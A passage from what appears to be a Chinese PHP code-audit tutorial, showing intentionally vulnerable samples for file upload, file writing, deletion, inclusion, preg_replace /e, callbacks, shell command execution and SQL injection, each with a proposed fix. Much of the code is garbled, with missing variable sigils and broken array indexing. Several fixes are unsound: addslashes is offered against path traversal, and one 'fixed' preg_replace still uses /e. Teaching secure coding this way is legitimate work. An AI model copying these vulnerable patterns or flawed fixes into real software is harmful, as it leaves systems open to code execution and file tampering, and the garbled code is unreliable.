class="string">"file"</span>][<span class="string">"tmp_name"</span>], <span class="string">"2.2/upload/"</span>._FILES <span class="string">"file"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Stored in: "</span>.<span class="string">"2.2/upload/"</span>.$_FILES <span class="string">"file"</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Invalid file"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>仅对<strong>Content-type</strong>验证，因为Content-type可以伪造导致可以绕过限制图片验证，导致任意文件上传<br>修复建议：<br>对后缀进行校验，采用白名单模式。保存文件名采用随机文件名+后缀的方式保存<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    ext = substr(FILES <span class="string">"file"</span>, strrpos($FILES <span class="string">"file"</span>, <span class="string">'.'</span>) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    filename = time().rand(<span class="number">100</span>, <span class="number">999</span>).<span class="string">'.'</span>.ext;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((ext == <span class="string">"jpg"</span> || ext == <span class="string">"jpeg"</span> || ext == <span class="string">"png"</span>) &amp;&amp; _FILES <span class="string">"file"</span> &lt; <span class="number">20000</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($_FILES <span class="string">"file"</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Return Code: "</span>.$_FILES <span class="string">"file"</span>.<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Upload: "</span>.$_FILES <span class="string">"file"</span>.<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Type: "</span>.$_FILES <span class="string">"file"</span>.<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Size: "</span>.$_FILES <span class="string">"file"</span> / <span class="number">1024.</span><span class="string">" Kb&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Temp file: "</span>.$_FILES <span class="string">"file"</span>.<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file_exists(<span class="string">"2.2/upload/"</span>.$filename)) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> $filename.<span class="string">" already exists. "</span>;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                move_uploaded_file(_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], <span class="string">"2.2/upload/"</span>.filename);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Stored in: "</span>.<span class="string">"2.2/upload/"</span>.$filename;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Invalid file"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>漏洞代码2</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">imageinfo = getimagesize(_FILES <span class="string">'userfile'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (imageinfo[<span class="string">'mime'</span>] != <span class="string">'image/gif'</span> &amp;&amp; imageinfo[<span class="string">'mime'</span>] != <span class="string">'image/jpeg'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, we only accept GIF and JPEG images\n"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uploaddir = <span class="string">'2.2/upload/'</span>;</span><br><span class="line"></span><br><span class="line">uploadfile = uploaddir.basename($_FILES <span class="string">'userfile'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file(_FILES[<span class="string">'userfile'</span>][<span class="string">'tmp_name'</span>], uploadfile)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File is valid, and was successfully uploaded.\n"</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File uploading failed.\n"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>仅通过读取文件头判断文件类型，可被绕过；后缀名未进行校验，导致任意文件上传、<br>修复建议：<br>参考漏洞代码1的修复方式<br>漏洞代码3</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">$blacklist = <span class="keyword">array</span>(<span class="string">".php"</span>, <span class="string">".phtml"</span>, <span class="string">".php3"</span>, <span class="string">".php4"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(blacklist <span class="keyword">as</span> item) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/&#123;item&#125;\$/i"</span>, _FILES <span class="string">'userfile'</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"We do not allow uploading PHP files\n"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uploaddir = <span class="string">'2.2/upload/'</span>;</span><br><span class="line"></span><br><span class="line">uploadfile = uploaddir.basename($_FILES <span class="string">'userfile'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file(_FILES[<span class="string">'userfile'</span>][<span class="string">'tmp_name'</span>], uploadfile)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File is valid, and was successfully uploaded.\n"</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File uploading failed.\n"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>扩展名黑名单过滤不严，可上传.php5文件进行绕过。导致任意文件上传<br>修复建议：<br>参考漏洞代码1的修复方式</p>
<p>2.3文件写入漏洞<br>0x01漏洞背景<br>在生成配置文件或者缓存文件的时候，未对传入的内容进行过滤，导致php代码执行漏洞<br>0x02漏洞代码及分析<br>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(_POST[<span class="string">'debug'</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    setting = _POST[<span class="string">'debug'</span>];</span><br><span class="line"></span><br><span class="line">    $content = <span class="string">"&lt;?php\r\n"</span>;</span><br><span class="line"></span><br><span class="line">    content. = <span class="string">"\$YCF['debug'] = '"</span>.setting.<span class="string">"';\r\n"</span>;</span><br><span class="line">    $content. = <span class="string">"?&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    file_put_contents(<span class="string">"2.3/config.php"</span>, $content);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>未对传入内容进行任何过滤，用单引号绕出去可以引起代码执行漏洞<br>修复建议：<br>进行addslashes函数过滤。且不要拼接在双引号内，否则同样会引起代码执行漏洞<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$setting = addslashes($_POST[<span class="string">'debug'</span>]);</span><br></pre></td></tr></table></figure>
<h3 id="2-4文件删除漏洞"><a href="#2-4文件删除漏洞" class="headerlink" title="2.4文件删除漏洞"></a>2.4文件删除漏洞</h3><h4 id="0x01漏洞背景-5"><a href="#0x01漏洞背景-5" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>删除文件时对路径或文件名过滤不严，会导致任意文件删除</p>
<h4 id="0x02漏洞代码及分析-4"><a href="#0x02漏洞代码及分析-4" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@$_GET[<span class="string">'action'</span>] == <span class="string">'del'</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]))</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        img = _GET[<span class="string">'img'</span>];</span><br><span class="line"></span><br><span class="line">        unlink(<span class="string">'2.4/'</span>.$img);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'删除图片成功'</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>对删除文件过滤不严，导致任意文件删除。<br>修复建议：<br>不允许..等跨目录字符出现。进行addslashes函数过滤<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">img = addslashes(_GET[<span class="string">'img'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strstr($img, <span class="string">'..'</span>))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'输入不合法'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-1文件包含漏洞"><a href="#3-1文件包含漏洞" class="headerlink" title="3.1文件包含漏洞"></a>3.1文件包含漏洞</h3><h4 id="0x01漏洞背景-6"><a href="#0x01漏洞背景-6" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行及敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。通常是由于include、require引起恶意包含<br>0x02漏洞代码及分析<br>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'func'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span> $_GET[<span class="string">'func'</span>];</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'3.1/default.php'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>在未过滤的情况下，可包含带有恶意代码的JPG文件、日志文件，甚至可以远程包含<br>修复建议：<br>不允许..等跨目录字符出现，对前缀跟后缀都进行限制，使用addslashes过滤%00防止被截断包含<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'func'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">    file = addslashes(_GET[<span class="string">'func'</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (strstr($file, <span class="string">'..'</span>))</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'输入不合法'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'3.1/'</span>.$file.<span class="string">'.php'</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'3.1/default.php'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<h3 id="3-2-preg-replace漏洞"><a href="#3-2-preg-replace漏洞" class="headerlink" title="3.2 preg_replace漏洞"></a>3.2 preg_replace漏洞</h3><h4 id="0x01漏洞背景-7"><a href="#0x01漏洞背景-7" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>preg_replace /e 修正符使 preg_replace() 将 replacement 参数当作 PHP代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法 的 PHP代码字符串，否则 PHP会在报告在包含 preg_replace()的行中出现语法解析错误。</p>
<h4 id="0x02漏洞代码及分析-5"><a href="#0x02漏洞代码及分析-5" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">"/test/e"</span>, $_GET[<span class="string">"h"</span>], <span class="string">"jutst test"</span>);</span><br><span class="line"></span><br><span class="line">? &gt;</span><br><span class="line"></span><br><span class="line">漏洞代码<span class="number">2</span>：</span><br><span class="line"></span><br><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">"/sphp[/php]s/ies"</span>, <span class="string">'test("\1")'</span>, $_GET[<span class="string">"h"</span>]);</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>语法不当的情况下，会导致代码执行漏洞<br>修复建议： 避免使用/e模式，第一、二个参数不让用户可控。第二个参数单引号改成双引号<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">"/sphp[/php]s/ies"</span>, <span class="string">"test('\1')"</span>, $_GET[<span class="string">"h"</span>]);</span><br></pre></td></tr></table></figure>
<h3 id="3-3回调漏洞"><a href="#3-3回调漏洞" class="headerlink" title="3.3回调漏洞"></a>3.3回调漏洞</h3><h4 id="0x01漏洞背景-8"><a href="#0x01漏洞背景-8" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>在PHP一些回调函数中，如果函数输入可控，可以利用回调assert等方法进行命令执行漏洞<br>0x02漏洞代码及分析</p>
<ul>
<li>漏洞代码1：</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">call_user_func(_REQUEST[<span class="string">'fun'</span>], _REQUEST[<span class="string">'pass'</span>]);</span><br><span class="line"></span><br><span class="line">? &gt;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">漏洞代码<span class="number">2</span>：</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">array_map(_REQUEST[<span class="string">'fun'</span>], _REQUEST[<span class="string">'pass'</span>]);</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>在fun传递可控的情况下，会引起代码执行漏洞</p>
<ul>
<li>修复建议：</li>
</ul>
<p>第一个参数不让用户可控</p>
<h4 id="建议修复代码："><a href="#建议修复代码：" class="headerlink" title="建议修复代码："></a>建议修复代码：</h4><p>array_map(‘addslashes’, $_REQUEST[‘pass’]);<br>参考文章：<br><a href="https://www.leavesongs.com/penetration/php-callback-backdoor.html" target="_blank" rel="noopener">https://www.leavesongs.com/penetration/php-callback-backdoor.html</a></p>
<h3 id="4-1命令执行漏洞"><a href="#4-1命令执行漏洞" class="headerlink" title="4.1命令执行漏洞"></a>4.1命令执行漏洞</h3><h4 id="0x01漏洞背景-9"><a href="#0x01漏洞背景-9" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>exec、system、shell_exec、passthru等命令执行函数，在传入的命令过滤不严，可导致任意命令执行漏洞，危及服务器。</p>
<h4 id="0x02漏洞代码及分析-6"><a href="#0x02漏洞代码及分析-6" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">url = _GET[&apos;url&apos;];</span><br><span class="line"></span><br><span class="line">content = system(&quot;curl url&quot;);</span><br><span class="line"></span><br><span class="line">echo $content;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>直接将可控内容带入命令执行中，导致产生漏洞<br>漏洞代码2：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">if (isset($_REQUEST[&apos;ip&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    target = trim(_REQUEST[&apos;ip&apos;]);</span><br><span class="line"></span><br><span class="line">    $substitutions = array(</span><br><span class="line"></span><br><span class="line">    &apos;&amp;&apos; = &gt;&apos;&apos;,</span><br><span class="line"></span><br><span class="line">    &apos;;&apos; = &gt;&apos;&apos;,</span><br><span class="line"></span><br><span class="line">    &apos;|&apos; = &gt;&apos;&apos;,</span><br><span class="line"></span><br><span class="line">    &apos;-&apos; = &gt;&apos;&apos;,</span><br><span class="line"></span><br><span class="line">    &apos;$&apos; = &gt;&apos;&apos;,</span><br><span class="line"></span><br><span class="line">    &apos;(&apos; = &gt;&apos;&apos;,</span><br><span class="line"></span><br><span class="line">    &apos;)&apos; = &gt;&apos;&apos;,</span><br><span class="line"></span><br><span class="line">    &apos;`&apos; = &gt;&apos;&apos;,</span><br><span class="line"></span><br><span class="line">    &apos;||&apos; = &gt;&apos;&apos;,</span><br><span class="line"></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    target = str_replace(array_keys(substitutions), substitutions, target);</span><br><span class="line">    cmd = shell_exec(&apos;ping -c 4 &apos;.target);</span><br><span class="line"></span><br><span class="line">    echo $target;</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>虽然进行了一些过滤，但是过滤不严，%0a可绕过命令执行<br>修复建议：<br>不要让用户可控的内容带入命令执行中<br>参考文章：<br><a href="http://www.freebuf.com/articles/web/137923.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/137923.html</a></p>
<h3 id="5-1普通注入漏洞"><a href="#5-1普通注入漏洞" class="headerlink" title="5.1普通注入漏洞"></a>5.1普通注入漏洞</h3><h4 id="0x01漏洞背景-10"><a href="#0x01漏洞背景-10" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>SQL注入是攻击者通过把恶意SQL命令插入到Web表单的输入域或页面请求的查询字符串中，来达到欺骗服务器执行恶意的SQL命令的一种攻击方式<br>0x02漏洞代码及分析</p>
<ul>
<li>漏洞代码1：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">$mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;, &apos;code&apos;); //数据库连接</span><br><span class="line">id = !empty(GET[&apos;id&apos;]) ? $GET[&apos;id&apos;] : &apos;1&apos;;</span><br><span class="line"></span><br><span class="line">data = mysqli - &gt;query(&quot;select content from test where id=$id&quot;);</span><br><span class="line"></span><br><span class="line">if ($data - &gt;num_rows !== &apos;0&apos;)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    arr = data - &gt;fetch_all();</span><br><span class="line"></span><br><span class="line">    foreach(arr as a)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        echo &apos;内容：&apos;.$a[0].&apos;&lt;br&gt;&apos;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>对于传入的内容未过滤，且SQL拼接的时候没有单引号保护</p>
<h4 id="修复建议：-1"><a href="#修复建议：-1" class="headerlink" title="修复建议："></a>修复建议：</h4><p>使用单引号保护并过滤内容<br>建议修复代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">id = !empty(GET[&apos;id&apos;]) ? addslashes($GET[&apos;id&apos;]) : &apos;1&apos;;</span><br><span class="line"></span><br><span class="line">data = 